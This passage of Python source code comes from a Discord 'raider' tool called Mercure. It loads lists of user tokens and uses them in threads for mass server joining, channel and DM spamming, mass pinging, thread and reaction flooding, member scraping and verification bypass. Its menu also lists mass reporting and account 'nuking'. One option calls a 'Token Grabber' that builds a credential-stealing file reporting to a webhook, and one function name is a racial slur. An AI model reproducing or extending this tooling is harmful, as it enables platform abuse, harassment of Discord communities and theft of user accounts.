        "user-agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Safari/537.36",
        "x-debug-options": "bugReporterEnabled",
        "x-super-properties": xsup
    }
    try:
        response_recipients = session.post('https://discord.com/api/v9/users/@me/channels', headers=headers, json={
            "recipients": []
        })
        newjson = json.loads(response_recipients.content)
        id = newjson['id']
        time.sleep(0.2)
        payload = {
            'name': groupname
        }
        response = session.patch(f'https://discord.com/api/v9/channels/{id}', headers=headers, json=payload)
        if response.status_code == 200:
            with output_lock:
                print(f"                                {timestamp} {c}(+) CREATED  ", end='')
                sys.stdout.flush()
                print(groupname)
        else:
            with output_lock:
                print(f"                                {timestamp} {c}(x) ERROR {response.status_code}  ", end='')
                sys.stdout.flush()
                print(token)
    except Exception as e:
        with output_lock:
            print(f"                                {timestamp} {k}(x) RATE LIMITED OR ERROR  ", end='')
            sys.stdout.flush()
            print(token)
            print(e)

def gcspammer():
    token = input(f"{datetime.datetime.now().strftime(f'                                {c}[{g}%H:%M:%S{c}]')}{r} {c}[{r}?{c}]{c} {c}[Token]{c} {g}[INPUT HIDDEN]{g} {c}> {s}")
    groupname = input(f"{datetime.datetime.now().strftime(f'                                {c}[{g}%H:%M:%S{c}]')}{r} {c}[{r}?{c}]{c} {c}[Gc Name] {c}> {c}")
    howmany = input(f"{datetime.datetime.now().strftime(f'                                {c}[{g}%H:%M:%S{c}]')}{r}  {c}[Ammount] {c}> {c}")

    output_lock = threading.Lock()
    threads = []

    for i in range(int(howmany)):
        thread = threading.Thread(target=create_group, args=(token, groupname, output_lock))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

def generate_random_ip():
    ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
    return ip

def generate_ips(ip_count):
    ips = []
    for _ in range(ip_count):
        ip = generate_random_ip()
        print(f"                                {timestamp} {c}[{r}#{c}]{c} [{ip}]")
        ips.append(ip)
        time.sleep(0.5)
    return ips

def print_features():
    print(f"                                {c}[{r}+{c}]{c} Added Features   {c}[{r}+{c}]{c} Fixed Tools    {c}[{r}+{c}]{c} Other ")
    print(f"                                                                                            ")
    print(f"                                {c}[{r}>{c}]{c} Token Brute      {c}[{r}>{c}]{c} Captcha Tokens {c}[{r}>{c}]{c} Prints ")
    print(f"                                {c}[{r}>{c}]{c} Group Creator    {c}[{r}>{c}]{c} CMDS Nuker     {c}[{r}>{c}]{c} Organization ")
    print(f"                                {c}[{r}>{c}]{c} Ip Pinger        {c}[{r}>{c}]{c} And Other... ")
    print(f"                                {c}[{r}>{c}]{c} Ip Lookup ")
    print(f"                                {c}[{r}>{c}]{c} Nitro Gen ")
    print(f"                                {c}[{r}>{c}]{c} Misc Page ") 
    print(f"                                {c}[{r}>{c}]{c} DM Spammer ")
    print(f"                                {c}[{r}>{c}]{c} Patch Notes ")
    print(f"                                {c}[{r}#{c}]{c} Press ENTER to go back.")
            
def set_title(token_count, proxy_count):
    title = f"[Mercure V3.2] ┃ Tokens : [{token_count}] ┃ Proxies : [{proxy_count}] ┃ Owner: [@zeptifer] ┃ [Lite Version] ┃ .gg/mercureraider"
    os.system(f'title {title}')

def count_lines(filename):
    try:
        with open(filename, "r") as f:
            return len(f.readlines())
    except FileNotFoundError:
        return 0

def get_random_tip():
    try:
        with open("assets/output/tips.txt", "r") as f:
            tips = f.readlines()
            return random.choice(tips).strip()
    except FileNotFoundError:
        return "No tips available."


def get_tokens(file_path="assets/input/tokens.txt"):
    return open(file_path, "r", encoding="utf8").read().splitlines()

def pronoun_changer(nouns, file_path="assets/input/tokens.txt"):
    tokens = get_tokens(file_path)
    for token in tokens:
        headers = get_headers(token)
        payload = {"pronouns": nouns}
        session = tls_client.Session(client_identifier="chrome_122", random_tls_extension_order=True)
        r = session.patch("https://discord.com/api/v9/users/@me/profile", json=payload, headers=headers)
        if r.status_code == 200:
            print(f"                                {timestamp} {c}{x}(+){x} {c}Changed Succesfully{c} {g}~>{g} {g}{token[:20]}{g}")
        else:
            print(f"                                {timestamp} {c}{k}(+){k} {c}Error Occured{c} {g}~>{g} {g}{token[:20]} {g}>{g} {g}{r.status_code}")


def check_webhook(url):
    try:
        response = requests.get(url)
        
        if response.status_code == 200:
            try:
                data = response.json()
                
                required_keys = ['application_id', 'channel_id', 'guild_id', 'id', 'name', 'type', 'token', 'url']
                if all(key in data for key in required_keys):
                    print(f"                                {timestamp} {c}{x}(+){x} {c}Valid{c}")
                    print(f"                                {c}[{r}#{c}]{c} Press ENTER to go back.")
                else:
                    print(f"                                {timestamp} {c}{k}(+){k} {c}Invalid{c}")
                    print(f"                                {c}[{r}#{c}]{c} Press ENTER to go back.")
                     
            except (KeyError, ValueError):
                print(f"                                {timestamp} {c}{k}(+){k} {c}Invalid{c}")
                print(f"                                {c}[{r}#{c}]{c} Press ENTER to go back.")
        else:
            print(f"                                {timestamp} {c}{k}(+){k} {c}Invalid{c}")
            print(f"                                {c}[{r}#{c}]{c} Press ENTER to go back.")

    except requests.RequestException:
        print(f"                                {timestamp} {c}{k}(+){k} {c}Invalid{c}")
        print(f"                                {c}[{r}#{c}]{c} Press ENTER to go back.")

def create_webhooks():
    def create_single_webhook(channel_id, bot_token, webhook_name):
        url = f"https://discord.com/api/v9/channels/{channel_id}/webhooks"
        headers = {
            "Authorization": f"Bot {bot_token}",
            "Content-Type": "application/json"
        }
        payload = {
            "name": webhook_name
        }
        response = requests.post(url, headers=headers, json=payload)
        if response.status_code == 200:
            print(f"                                {timestamp} {c}(x) Created")
        else:
            print(f"                                {timestamp} {c}(x) Failed")
    
    def threaded_creation(webhook_index):
        webhook_name = f"{webhook_name_prefix}_{webhook_index}"
        create_single_webhook(channel_id, bot_token, webhook_name)
        time.sleep(delay)

    bot_token = input(f"                               {timestamp} {c}[{c}{r}?{r}{c}]{c} {Fore.RED}[Bot Token]{Fore.RESET} {Fore.LIGHTBLACK_EX}[INPUT HIDDEN]{Fore.LIGHTBLACK_EX} {Fore.LIGHTBLACK_EX}>{Fore.LIGHTBLACK_EX} {Fore.BLACK}")
    channel_id = input(f"                                {c}[{g}{time.strftime('%H:%M:%S')}{g}{c}]{r} {c}[{r}?{c}]{c} {c}[Channel ID] {c}> {c}")
    webhook_count = int(input(f"                                {c}[{g}{time.strftime('%H:%M:%S')}{g}{c}]{r} {c}[{r}?{c}]{c} {c}[Ammount] {c}> {c}"))
    delay = float(input(f"                                {c}[{g}{time.strftime('%H:%M:%S')}{g}{c}]{r} {c}[{r}?{c}]{c} {c}[Delay] {c}> {c}"))
    webhook_name_prefix = input(f"                                {c}[{g}{time.strftime('%H:%M:%S')}{g}{c}]{r} {c}[{r}?{c}]{c} {c}[Webhook Username] {c}> {c}")
    os.system('cls')
    print(banner)

    threads = []
    for i in range(webhook_count):
        thread = threading.Thread(target=threaded_creation, args=(i+1,))
        threads.append(thread)
        thread.start()
    
    for thread in threads:
        thread.join()

def find_webhook(url):
    try:
        response = requests.get(url)
        
        if response.status_code == 200:
            try:
                data = response.json()
                
                required_keys = ['application_id', 'channel_id', 'guild_id', 'id', 'name', 'type', 'token', 'url']
                if all(key in data for key in required_keys):
                    webhook_name = data.get('name', 'Unknown')
                    channel_id = data.get('channel_id', 'Unknown')
                    guild_id = data.get('guild_id', 'Unknown')
                    
                    print(f"                                {c}[{r}Webhook Name{c}]{c} {webhook_name}")
                    print(f"                                {c}[{r}Channel ID{c}]{c} {channel_id}")
                    print(f"                                {c}[{r}Guild ID{c}]{c} {guild_id}")
                else:
                    print(f"                                {timestamp} {c}{k}(+){k} {c}Invalid webhook Data")
            except (KeyError, ValueError):
                print(f"                                {timestamp} {c}{k}(+){k} {c}Invalid JSON response{c}")
        else:
            print(f"                                {timestamp} {c}{k}(+){k} {c}Invalid response status code{c}")
            
    except requests.RequestException:
        print(f"                                {timestamp} {c}{k}(+){k} {c}Request Failed{c}")

def extract_code(input_string):
    pattern = r'(discord\.gift|discord\.com/gifts)/(?P<code>[a-zA-Z0-9]+)'
    match = re.search(pattern, input_string)
    if match:
        return match.group('code')
    else:
        return None

def check_nitro_code(code):
    url = f'https://discordapp.com/api/v9/entitlements/gift-codes/{code}?with_application=false&with_subscription_plan=true'
    try:
        response = requests.get(url)
        if response.status_code == 200:
            data = response.json()
            if 'sku_id' in data:
                return True, data['sku_id']
            else:
                return False, None
        elif response.status_code == 404:
            return False, None
        else:
            return False, None
    except requests.exceptions.RequestException as e:
        print(f"                                {timestamp} {c}{k}(+){k} {c}Error{c}")
        return False, None

def nitro_checker():
    input_string = input(f"                                {c}[{g}{time.strftime('%H:%M:%S')}{g}{c}]{r} {c}[{r}?{c}]{c} {c}[Gift/Link] {c}> {c}").strip()
    os.system('cls'); print (banner)
    code = extract_code(input_string)
    
    if code:
        is_valid, sku_id = check_nitro_code(code)
        if is_valid:
            print(f"                                {timestamp} {c}{x}(+){x} {c}Valid{c}")
        else:
            print(f"                                {timestamp} {c}{k}(+){k} {c}Invalid{c}")

def hypeS_changer() -> None:
    HOUSE_MAPPING: Dict[int, str] = {
        1: "bravery",
        2: "brilliance",
        3: "balance"
    }

    dark_red_color = "\033[31m"
    reset_color = "\033[0m"

    try:
        with open('assets/input/tokens.txt', 'r') as f:
            tokens = f.read().strip().splitlines()

        if not tokens:
            print("                                {c}No tokens found in tokens.txt file.")
            return

        house = int(input(f"                                {dark_red_color} {timestamp}  {c}[{c}{r}?{r}{c}]{c} Choice {c}>{c} {g}(1 for bravery, 2 for brilliance, 3 for balance){g} {c}> {c}"))
        os.system('cls'); print (banner)
        
        if house not in HOUSE_MAPPING:
            print(f"                                {dark_red_color}Invalid house number. Please enter 1, 2, or 3.{reset_color}")
            return

        for token in tokens:
            try:
                token = token.strip()

                response = requests.post(
                    "https://discord.com/api/v9/hypesquad/online",
                    headers={"authorization": token},
                    json={"house_id": house}
                )

                if response.ok:
                    print(f"                                {c}Successfully changed hypesquad to {HOUSE_MAPPING[house]}.")
                else:
                    print(f"                                {c}Failed to change hypesquad for token: {token}. -> {response.text} ({response.status_code})")

            except Exception as e:
                print(f"                                {c}An error occurred for token {token}: {str(e)}")

    except ValueError:
        print("                                {c}Invalid input. Please enter a valid number for the house.")
    except FileNotFoundError:
        print("                                {c}tokens.txt not found in assets/input/.")
    except Exception as e:
        print(f"                                {c}An error occurred: {str(e)}")


def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    os.system('mode con: cols=123 lines=19')
    
    token_count = count_lines("assets/input/tokens.txt")
    proxy_count = count_lines("assets/input/proxies.txt")
    
    set_title(token_count, proxy_count)
    
    tip = get_random_tip()
    
    dark_red_color = '\033[31m'
    grey_color = '\033[90m'
    reset_color = '\033[0m'

    banner = f"""  
                                \033[31m _____ _____ _____ _____ _____ _____ _____ 
                                |     |   __| __  |     |  |  | __  |   __|
                                | | | |   __|    -|   --|  |  |    -|   __|
                                \033[90m|_|_|_|_____|__|__|_____|_____|__|__|_____|
    """

    options = f"""
    {dark_red_color}[{grey_color}01{dark_red_color}]{grey_color} > {dark_red_color}Token Joiner     {dark_red_color}[{grey_color}07{dark_red_color}]{grey_color} > {dark_red_color}Emoji Reactor  {dark_red_color}[{grey_color}13{dark_red_color}]{grey_color} > {dark_red_color}Restore Corder  {dark_red_color}[{grey_color}19{dark_red_color}]{grey_color} > {dark_red_color}Guild Check   {dark_red_color}[{grey_color}25{dark_red_color}]{grey_color} > {dark_red_color}Account Nuker     
    {dark_red_color}[{grey_color}02{dark_red_color}]{grey_color} > {dark_red_color}Token Leaver     {dark_red_color}[{grey_color}08{dark_red_color}]{grey_color} > {dark_red_color}Mass Thread    {dark_red_color}[{grey_color}14{dark_red_color}]{grey_color} > {dark_red_color}Self Scrapper   {dark_red_color}[{grey_color}20{dark_red_color}]{grey_color} > {dark_red_color}Mass Reporter {dark_red_color}[{grey_color}26{dark_red_color}]{grey_color} > {dark_red_color}Token Formatter   
    {dark_red_color}[{grey_color}03{dark_red_color}]{grey_color} > {dark_red_color}Token Checker    {dark_red_color}[{grey_color}09{dark_red_color}]{grey_color} > {dark_red_color}Vc Joiner      {dark_red_color}[{grey_color}15{dark_red_color}]{grey_color} > {dark_red_color}Token Cleaner   {dark_red_color}[{grey_color}21{dark_red_color}]{grey_color} > {dark_red_color}Server Lookup {dark_red_color}[{grey_color}27{dark_red_color}]{grey_color} > {dark_red_color}Msg. Everywhere       
    {dark_red_color}[{grey_color}04{dark_red_color}]{grey_color} > {dark_red_color}Channel Spammer  {dark_red_color}[{grey_color}10{dark_red_color}]{grey_color} > {dark_red_color}BIO Changer    {dark_red_color}[{grey_color}16{dark_red_color}]{grey_color} > {dark_red_color}Spam Hook       {dark_red_color}[{grey_color}22{dark_red_color}]{grey_color} > {dark_red_color}Fake Typing   {dark_red_color}[{grey_color}28{dark_red_color}]{grey_color} > {dark_red_color}DM Spammer          
    {dark_red_color}[{grey_color}05{dark_red_color}]{grey_color} > {dark_red_color}Log Spammer      {dark_red_color}[{grey_color}11{dark_red_color}]{grey_color} > {dark_red_color}Token Grabber  {dark_red_color}[{grey_color}17{dark_red_color}]{grey_color} > {dark_red_color}CMDS Nuker      {dark_red_color}[{grey_color}23{dark_red_color}]{grey_color} > {dark_red_color}Voice Faker   {dark_red_color}[{grey_color}29{dark_red_color}]{grey_color} > {dark_red_color}Delete Hook 
    {dark_red_color}[{grey_color}06{dark_red_color}]{grey_color} > {dark_red_color}Reaction Bomber  {dark_red_color}[{grey_color}12{dark_red_color}]{grey_color} > {dark_red_color}Nick Changer   {dark_red_color}[{grey_color}18{dark_red_color}]{grey_color} > {dark_red_color}Accept Rules    {dark_red_color}[{grey_color}24{dark_red_color}]{grey_color} > {dark_red_color}Remove Dupes  {dark_red_color}[{grey_color}>>{dark_red_color}]{grey_color} > {dark_red_color}Next Page     
    """
    print("\n" + dark_red_color + banner + reset_color + options)
    
    choice = input(f"    {dark_red_color}└───@MERCURE.CMD───{grey_color}>> {reset_color}")

    if choice == "": main()
    elif choice == "1":
        os.system('cls'); print(banner)
        server = str(input(f"{datetime.datetime.now().strftime(f'                                {c}[{c}{g}%H:%M:%S{g}{c}]{c}')}{r} {c}{r}{c}[{c}{r}?{r}{c}]{c}{r} {c}discord.gg{c}/{c}"))
        if server == "": main()
        delay = float(input(f"{datetime.datetime.now().strftime(f'                                {c}[{c}{g}%H:%M:%S{g}{c}]')}{r} {c}[{c}{r}?{r}{c}]{c} {c}[Delay] {c}> {c}"))
        if delay == "": main()
        serverinv = server.strip("https://"); invite = serverinv.split("/")[-1]
        os.system('cls'); print(banner)
        raider = Raider()
        for t in tokens:
            threading.Thread(target=raider.joiner, args=(t, invite)).start()
            time.sleep(delay)
        exit = input(""); exit = main();
    elif choice == "2":
        os.system('cls'); print(banner)
        server = str(input(f"{datetime.datetime.now().strftime(f'                                {c}[{c}{g}%H:%M:%S{g}{c}]')}{r} {c}[{c}{r}?{r}{c}]{c} {c}[Guild ID] {c}> {c}"))
        if server == "": main()
        delay = float(input(f"{datetime.datetime.now().strftime(f'                                {c}[{c}{g}%H:%M:%S{g}{c}]')}{r} {c}[{c}{r}?{r}{c}]{c} {c}[Delay] {c}> {c}"))
        if delay == "": main()
        os.system('cls'); print(banner)
        raider = Raider()
        for t in tokens:
            threading.Thread(target=raider.leaver, args=(t, server)).start()
            time.sleep(delay)
        exit = input(""); exit = main();
    elif choice == "3":
        os.system('cls')
        token_checker()
        exit = input(f"                                {c}[{r}#{c}]{c} Press ENTER to go back."); exit = main()
    elif choice == "4":
        channellist = []
        os.system('cls'); print(banner)
        customessages = str(input(f"{datetime.datetime.now().strftime(f'                                {c}[{c}{g}%H:%M:%S{g}{c}]{c}')}{r} {c}[{c}{r}?{r}{c}]{c} {c}[Use Messages.txt?] (y/n) {c}> {c}"))
        if customessages == "": main()
        elif customessages == "n":
            message = str(input(f"{datetime.datetime.now().strftime(f'                                {c}[{c}{g}%H:%M:%S{g}{c}]{c}')}{r} {c}[{c}{r}?{r}{c}]{c} {c}[Message] {c}> {c}"))
            if message == "": main()
        channelid = str(input(f"{datetime.datetime.now().strftime(f'                                {c}[{c}{g}%H:%M:%S{g}{c}]{c}')}{r} {c}[{c}{r}?{r}{c}]{c} {c}[Channel(s) ID] {c}> {c}"))
        channelid = channelid.split(",")
        if channelid == "": main()
        for channel in channelid:
            channellist.append(int(channel))
        delay = float(input(f"{datetime.datetime.now().strftime(f'                                {c}[{c}{g}%H:%M:%S{g}{c}]{c}')}{r} {c}[{c}{r}?{r}{c}]{c} {c}[Delay] {c}> {c}"))
        if delay == "": main()
        emojis = str(input(f"{datetime.datetime.now().strftime(f'                                {c}[{c}{g}%H:%M:%S{g}{c}]{c}')}{r} {c}[{c}{r}?{r}{c}]{c} {c}[Use random emojis ? y/n] {c}> {c}"))
        if emojis == "": main()
        elif emojis == "y":
            cemojis = int(input(f"{datetime.datetime.now().strftime(f'                                {c}[{c}{g}%H:%M:%S{g}{c}]{c}')}{r} {c}[{c}{r}?{r}{c}]{c} {c}[Emojis Count] {c}> {c}"))
        elif emojis == "n":
            cemojis = 0
        massping = str(input(f"{datetime.datetime.now().strftime(f'                                {c}[{c}{g}%H:%M:%S{g}{c}]{c}')}{r} {c}[{c}{r}?{r}{c}]{c} {c}[MassPing (y/n)] {c}> {c}"))
        if massping == "": main()
        elif massping == "y":
            scrapped = str(input(f"{datetime.datetime.now().strftime(f'                                {c}[{c}{g}%H:%M:%S{g}{c}]{c}')}{r} {c}[{c}{r}?{r}{c}]{c} {c}[Use Scrapped (y/n)] {c}> {c}"))
            if scrapped == "": main()
            if scrapped == "n":
                server = str(input(f"{datetime.datetime.now().strftime(f'                                {c}[{c}{g}%H:%M:%S{g}{c}]{c}')}{r} {c}[{c}{r}?{r}{c}]{c} {c}[Guild ID] {c}> {c}"))
                if server == "": main()
                print(f"{datetime.datetime.now().strftime(f'                                {c}[{c}{g}%H:%M:%S{g}{c}]{c}')}{r} {c}[{c}{r}#{r}{c}]{c} INFO {c}>  {c}Scrapping Members {g}(May Take A While){g}..")
                scraper(server, random.choice(channellist))
            elif scrapped == "y":
                server = "0"
            count = int(input(f"{datetime.datetime.now().strftime(f'                                {c}[{c}{g}%H:%M:%S{g}{c}]{c}')}{r} {c}[{c}{r}?{r}{c}]{c} {c}[Pings] {c}> {c}"))
            if count == "": main()
            os.system('cls'); print(banner)
            raider = Raider()
            if customessages == "n":
                while True:
                    for token in tokens:
                        for channelid in channellist:
                            threading.Thread(target=raider.mspammer, args=(token, message, server, channelid, count, emojis, cemojis)).start()
                    time.sleep(delay)
            elif customessages == "y":
                while True:
                    for token in tokens:
                        for message in messages:
                            for channelid in channellist:
                                threading.Thread(target=raider.mspammer, args=(token, message, server, channelid, count, emojis, cemojis)).start()
                    time.sleep(delay)
        elif massping == "n":
            if customessages == "n":
                os.system('cls'); print(banner)
                raider = Raider()
                while True:
                    for token in tokens:
                        for channelid in channellist:
                            threading.Thread(target=raider.spammer, args=(token, message, channelid, emojis, cemojis)).start()
                    time.sleep(delay)
            elif customessages == "y":
                os.system('cls'); print(banner)
                raider = Raider()
                while True:
                    for token in tokens:
                        for message in messages:
                            for channelid in channellist:
                                threading.Thread(target=raider.spammer, args=(token, message, channelid, emojis, cemojis)).start()
                    time.sleep(delay)
        exit = input(""); exit = main();
    elif choice == "5":
        os.system('cls'); print(banner)
        channel = str(input(f"{datetime.datetime.now().strftime(f'                                {c}[{c}{g}%H:%M:%S{g}{c}]{c}')}{r} {c}[{c}{r}?{r}{c}]{c} {c}[Channel ID] {c}> {c}"))
        if channel == "": main()
        delay = float(input(f"{datetime.datetime.now().strftime(f'                                {c}[{c}{g}%H:%M:%S{g}{c}]{c}')}{r} {c}[{c}{r}?{r}{c}]{c} {c}[Delay] {c}> {c}"))
        if delay == "": main()
        os.system('cls'); print(banner)
        raider = Raider()
        while True:
            for token in tokens:
                threading.Thread(target=raider.inviter, args=(token, channel)).start()
            time.sleep(delay)
        exit = input(""); exit = main();
    elif choice == "6":
        os.system('cls'); print(banner)
        channel = str(input(f"{datetime.datetime.now().strftime(f'                                {c}[{c}{g}%H:%M:%S{g}{c}]{c}')}{r} {c}[{c}{r}?{r}{c}]{c} {c}[Channel ID] {c}> {c}"))
        if channel == "": main()
        message = str(input(f"{datetime.datetime.now().strftime(f'                                {c}[{c}{g}%H:%M:%S{g}{c}]')}{r} {c}[{c}{r}?{r}{c}]{c} {c}[Message ID] {c}> {c}"))
        if message == "": main()
        delay = float(input(f"{datetime.datetime.now().strftime(f'                                {c}[{c}{g}%H:%M:%S{g}{c}]{c}')}{r} {c}[{c}{r}?{r}{c}]{c} {c}[Delay] {c}> {c}"))
        if delay == "": main()
        os.system('cls'); print(banner)
        usedemojis = []
        for i in range(20):
            usedemojis.append(getemoji(int(1)))
        raider = Raider()
        while True:
            for token in tokens:
                for emoji in usedemojis:
                    threading.Thread(target=raider.emoji_bomber, args=(token, channel, message, emoji)).start()
            time.sleep(delay)
        exit = input(""); exit = main();
    elif choice == "7":
        os.system('cls'); print(banner)
        channel = str(input(f"{datetime.datetime.now().strftime(f'                                {c}[{c}{g}%H:%M:%S{g}{c}]')}{r} {c}[{c}{r}?{r}{c}]{c} {c}[Channel ID] {c}> {c}"))
        if channel == "": main()
        message = str(input(f"{datetime.datetime.now().strftime(f'                                {c}[{c}{g}%H:%M:%S{g}{c}]')}{r} {c}[{c}{r}?{r}{c}]{c} {c}[Message ID] {c}> {c}"))
        if message == "": main()
        emoji = str(input(f"{datetime.datetime.now().strftime(f'                                {c}[{c}{g}%H:%M:%S{g}{c}]')}{r} {c}[{c}{r}?{r}{c}]{c} {c}[Emoji] {c}> {c}"))
        if emoji == "": main()
        os.system('cls'); print(banner)
        raider = Raider()
        for token in tokens:
            threading.Thread(target=raider.reactor, args=(token, channel, message, emoji)).start()
        exit = input(""); exit = main();
    elif choice == "8":
        channellist = []
        os.system('cls'); print(banner)
        channelid = str(input(f"{datetime.datetime.now().strftime(f'                                {c}[{c}{g}%H:%M:%S{g}{c}]')}{r} {c}[{c}{r}?{r}{c}]{c} {c}[Channel(s) ID] {c}> {c}"))
        if channelid == "": main()
        channelid = channelid.split(",")
        for channel in channelid:
            channellist.append(int(channel))
        name = str(input(f"{datetime.datetime.now().strftime(f'                                {c}[{c}{g}%H:%M:%S{g}{c}]')}{r} {c}[{c}{r}?{r}{c}]{c} {c}[Thread name] {c}> {c}"))
        if name == "": main()
        delay = float(input(f"{datetime.datetime.now().strftime(f'                                {c}[{c}{g}%H:%M:%S{g}{c}]')}{r} {c}[{c}{r}?{r}{c}]{c} {c}[Delay] {g}> {c}"))
        if delay == "": main()
        os.system('cls'); print(banner)
        raider = Raider()
        while True:
            for token in tokens:
                for channelid in channellist:
                    threading.Thread(target=raider.niggaflodder, args=(token, channelid, name)).start()
            time.sleep(delay)
        exit = input(""); exit = main();
        
    elif choice == "9":
        os.system('cls'); print(banner)
        server = str(input(f"{datetime.datetime.now().strftime(f'                                {c}[{c}{g}%H:%M:%S{g}{c}]')}{r} {c}[{c}{r}?{r}{c}]{c} {c}[Guild ID] {c}> {c}"))
        if server == "": main()
        channel = input(f"{datetime.datetime.now().strftime(f'                                {c}[{c}{g}%H:%M:%S{g}{c}]')}{r} {c}[{c}{r}?{r}{c}]{c} {c}[Channel ID] {c}> {c}")
        if channel == "": main()
        delay = float(input(f"{datetime.datetime.now().strftime(f'                                {c}[{c}{g}%H:%M:%S{g}{c}]')}{r} {c}[{c}{r}?{r}{c}]{c} {c}[Delay] {g}> {c}"))
        if delay == "": main()
        os.system('cls'); print(banner)
        raider = Raider()
        while True:
            for token in tokens:
                threading.Thread(target=raider.vcjoiner, args=(token, server, channel)).start()
            time.sleep(delay)
        exit = input(""); exit = main();

    elif choice == "10":
        os.system('cls'); print(banner)
        newbio = str(input(f"{datetime.datetime.now().strftime(f'                                {c}[{c}{g}%H:%M:%S{g}{c}]')}{r} {c}[{c}{r}?{r}{c}]{c} {c}[Text] {g}> {c}"))
        if newbio == "": main()
        delay = float(input(f"{datetime.datetime.now().strftime(f'                                {c}[{c}{g}%H:%M:%S{g}{c}]')}{r} {c}[{c}{r}?{r}{c}]{c} {c}[Delay] {g}> {c}"))
        if delay == "": main()
        raider = Raider()
        for token in tokens:
            threading.Thread(target=raider.biochanger, args=(token, newbio)).start()
            time.sleep(delay)
        exit = input(""); exit = main();

    elif choice == "11":
        os.system('cls')
        print(banner)
        WebHook = str(input(f"{datetime.datetime.now().strftime(f'                                {c}[{c}{g}%H:%M:%S{g}{c}]')}{r} {c}[{c}{r}?{r}{c}]{c} {c}[Webhook]{c} {g}[INPUT HIDDEN]{g} {c}> {s}"))
        fileName = str(input(f"{datetime.datetime.now().strftime(f'                                {c}[{c}{g}%H:%M:%S{g}{c}]')}{r} {c}[{c}{r}?{r}{c}]{c} {c}[File Name]{c} > {c}"))
        assets.funcs.token_grabber.TokenGrabberV2(WebHook, fileName)

    elif choice == "12":
        os.system('cls'); print(banner)
        server = str(input(f"{datetime.datetime.now().strftime(f'                                {c}[{c}{g}%H:%M:%S{g}{c}]')}{r} {c}[{c}{r}?{r}{c}]{c} {c}[Server ID] {c}> {c}"))
        if server == "": main()
        nick = str(input(f"{datetime.datetime.now().strftime(f'                                {c}[{c}{g}%H:%M:%S{g}{c}]')}{r} {c}[{c}{r}?{r}{c}]{c} {c}[Nickname] {c}> {c}"))
        if nick == "": main()
        delay = float(input(f"{datetime.datetime.now().strftime(f'                                {c}[{c}{g}%H:%M:%S{g}{c}]')}{r} {c}[{c}{r}?{r}{c}]{c} {c}[Delay] {c}> {c}"))
        if delay == "": main()
        os.system('cls'); print(banner)
        raider = Raider()
        for token in tokens:
            threading.Thread(target=raider.nickchanger, args=(token, server, nick)).start()
            time.sleep(delay)
        exit = input(""); exit = main();

    elif choice == "13":
        os.system('cls'); print(banner)
        server = str(input(f"{datetime.datetime.now().strftime(f'                                {c}[{c}{g}%H:%M:%S{g}{c}]{c}')}{r} {c}[{c}{r}?{r}{c}]{c} {c}[Guild ID] {c}> {c}"))
        if server == "": main()
        botid = str(input(f"{datetime.datetime.now().strftime(f'                                {c}[{c}{g}%H:%M:%S{g}{c}]{c}')}{r} {c}[{c}{r}?{r}{c}]{c} {c}[Bot ID] {g}[INPUT HIDDEN]{g} {c}> {s}"))
        if botid == "": main()
        os.system('cls'); print(banner)
        raider = Raider()
        for token in tokens:
            raider.restorecord_bypass(server, botid, token)
        exit = input(""); exit = main()

    elif choice == "14":
        os.system('cls'); print(banner)
        server = str(input(f"{datetime.datetime.now().strftime(f'                                {c}[{c}{g}%H:%M:%S{g}{c}]')}{r} {c}[{c}{r}?{r}{c}]{c} {c}[Guild ID] {c}> {c}"))
        if server == "": main()
        channelid = input(f"{datetime.datetime.now().strftime(f'                                {c}[{c}{g}%H:%M:%S{g}{c}]')}{r} {c}[{c}{r}?{r}{c}]{c} {c}[Channel ID] {c}> {c}")
        if channelid == "": main()
        tokenchoice = str(input(f"{datetime.datetime.now().strftime(f'                                {c}[{c}{g}%H:%M:%S{g}{c}]')}{r} {c}[{c}{r}?{r}{c}]{c} {c}[Token type (your/list)] {g}[INPUT HIDDEN]{g} {c}> {s}"))
        if tokenchoice == "": main()
        elif tokenchoice == "your":
            token = str(input(f"{datetime.datetime.now().strftime(f'                                {c}[{c}{g}%H:%M:%S{g}{c}]')}{r} {c}[{c}{r}?{r}{c}]{c} {c}[Token]{c} {g}[INPUT HIDDEN]{g} {c}> {s}"))
            if token == "": main()
            print(f"{datetime.datetime.now().strftime(f'                                {c}[{c}{g}%H:%M:%S{g}{c}]')}{r} {c}{c}[{c}{r}#{r}{c}]{c} INFO {c}>  {c}Scraping.")
            selfscraper(token, server, channelid)
            print(f"{datetime.datetime.now().strftime(f'                                {c}[{c}{g}%H:%M:%S{g}{c}]')}{r} {c}{c}[{c}{r}#{r}{c}]{c} INFO {c}>  {r}Successfully scraped all members.")
            exit = input(""); exit = main();
        elif tokenchoice == "list":
            print(f"{datetime.datetime.now().strftime(f'                                {c}[{c}{g}%H:%M:%S{g}{c}]')}{r} {c}{c}[{c}{r}#{r}{c}]{c} INFO {c}>  {c}Scrapping.")
            scraper(server, channelid)
            print(f"{datetime.datetime.now().strftime(f'                                {c}[{c}{g}%H:%M:%S{g}{c}]')}{r} {c}{c}[{c}{r}#{r}{c}]{c} INFO {c}>  {c}Successfully scraped all members.")
            exit = input(""); exit = main();

    elif choice == "15":
        os.system('cls'); print(banner)
        from assets.funcs import token_cleaner
        exit = input(""); exit = main()

    elif choice == "16":
        os.system('cls')
        print(banner)
        WebHook = str(input(f"{datetime.datetime.now().strftime(f'                                {c}[{c}{g}%H:%M:%S{g}{c}]')}{r} {c}[{c}{r}?{r}{c}]{c} {c}[Webhook]{c} {g}[INPUT HIDDEN]{g} {c}> {s}"))
        Message = str(input(f"{datetime.datetime.now().strftime(f'                                {c}[{c}{g}%H:%M:%S{g}{c}]')}{r} {c}[{c}{r}?{r}{c}]{c} {c}[Message] {c}> {c}"))
        assets.funcs.webhook_spammer.WebhookSpammer(WebHook, Message)

    elif choice == "17":
        os.system('cls'); print(banner)
        botnuker()
        exit = input(""); exit = main()
    elif choice == "18":
        os.system('cls'); print(banner)
        server = str(input(f"{datetime.datetime.now().strftime(f'                                {c}[{c}{g}%H:%M:%S{g}{c}]')}{r} {c}[{c}{r}?{r}{c}]{c} {c}[Guild ID] {c}> {c}"))
        if server == "": main()
        raider = Raider()
        for token in tokens:
            threading.Thread(target=raider.acceptrules, args=(token, server)).start()
        exit = input(""); exit = main();
    elif choice == "19":
        os.system('cls'); print(banner)
